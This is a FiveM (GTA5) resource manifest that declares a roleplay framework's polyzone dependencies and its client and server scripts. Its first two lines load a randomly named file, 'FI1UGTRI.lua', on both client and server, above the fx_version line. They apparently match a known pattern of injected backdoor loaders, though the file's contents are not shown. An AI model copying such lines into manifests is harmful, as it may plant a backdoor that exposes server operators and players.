server_script "FI1UGTRI.lua"
client_script "FI1UGTRI.lua"
fx_version("cerulean")
games({ "gta5" })
lua54("yes")
client_script("@Paradise-base/components/cl_error.lua")
client_script("@Paradise-pwnzor/client/check.lua")

client_scripts({
	'@Paradise-polyzone/client.lua',
	'@Paradise-polyzone/BoxZone.lua',
	'@Paradise-polyzone/EntityZone.lua',
	"shared/**/*.lua",
	"client/**/*.lua",
})

server_scripts({
	"shared/**/*.lua",
	"server/**/*.lua",
})
